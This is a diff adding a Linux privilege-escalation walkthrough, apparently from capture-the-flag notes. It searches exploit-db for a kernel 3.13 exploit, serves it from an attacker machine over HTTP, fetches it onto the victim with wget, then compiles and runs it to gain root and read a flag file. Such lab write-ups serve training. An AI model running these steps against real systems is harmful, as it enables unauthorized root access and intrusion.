@@ -1,5 +1,84 @@
 ### ***Linux Privilege Escalation Examples***
 
+<details>
+<summary>Kernel Exploits</summary>
+ <br> 
+Step 1: Identify & Search for Exploits
+The first step is to identify potential exploits for the target system. You can use Searchsploit to find known vulnerabilities for the specific kernel version.
+    
+    uname -a #will print the Kernel Version
+    searchsploit linux 3.13.0-24
+This will list exploits relevant to the kernel version. In this case, the target kernel version is 3.13.0-24.
+![image](https://github.com/user-attachments/assets/5629083f-a755-4c84-be78-db0c17a3e6fe)
+
+Step 2: Locate the Exploit
+Once you’ve identified a suitable exploit, use the locate command to find its full path and inspect the code.
+
+    locate linux/local/37292.c
+    cat /usr/share/exploitdb/exploits/linux/local/37292.c
+This shows the contents of the exploit file, which you'll need to compile and execute.
+![image](https://github.com/user-attachments/assets/3647680d-156d-453a-9f3b-8adb43c9396f)
+
+Step 3: Check for Compiler and Permissions
+Before proceeding with the exploit, ensure the necessary tools and permissions are available on the target system.
+
+Check for GCC: Ensure that the GCC compiler is installed.
+
+    which gcc
+Check File Permissions: Verify that you have write permissions to the directory where you’ll save the exploit.
+
+    ls -la
+ ![image](https://github.com/user-attachments/assets/22116cd7-9f80-4db0-b85c-2120955a17bc)
+
+Step 4: Copy and Rename the Exploit
+Next, copy the exploit code to your Downloads folder and rename it to something like ofs.c.
+
+    sudo cp /usr/share/exploitdb/exploits/linux/local/37292.c /home/kali/Downloads/
+    mv 37292.c ofs.c
+![image](https://github.com/user-attachments/assets/28fa1d5a-7532-42b9-bd10-1cfbabc9bcfa)
+
+Step 5: Set Up an HTTP Server to Serve the Payload
+On your attacker machine, start an HTTP server to serve the payload file (ofs.c) to the victim machine.
+
+    updog -p 80
+On the victim machine, use wget to download the exploit:
+
+    wget http://10.6.42.239/ofs.c
+![image](https://github.com/user-attachments/assets/b8dc99c8-d633-4f6c-a42c-8273b7f7e63f)
+
+Step 6: Compile the Exploit
+Now that the exploit is on the victim’s machine, compile the C code to create the binary that will escalate privileges.
+
+    gcc ofs.c -o ofs
+    ./ofs
+Step 7: Verify Root Access
+Once the exploit runs successfully, you should have root privileges. Verify by checking your user ID with whoami.
+
+    whoami
+You should see root, indicating that you’ve escalated to root privileges.
+![image](https://github.com/user-attachments/assets/7729b24c-ccb3-49b2-af83-32e608213bcd)
+
+Step 8: Locate the Flag
+As a final step, search for the flag file on the system. You can use the following commands to locate and read the flag:
+
+    find / -name flag1.txt 2>/dev/null
+    cat /home/matt/flag1.txt
+![image](https://github.com/user-attachments/assets/6fd0400a-4cff-4a01-a06d-1640757f4df3)
+
+Summary
+Privilege Escalation: This technique involves using kernel exploits to escalate user privileges.
+
+Exploit Search: Use tools like Searchsploit to find relevant vulnerabilities for your target system.
+
+Payload Delivery: Serve the payload using an HTTP server and download it on the target machine.
+
+Compilation and Execution: Compile the C code and run it to gain root access.
+
+Find and Read Flag: After gaining root privileges, locate the flag file to complete the task.
+
+
+</details>
+===
 NFS
 ===
 
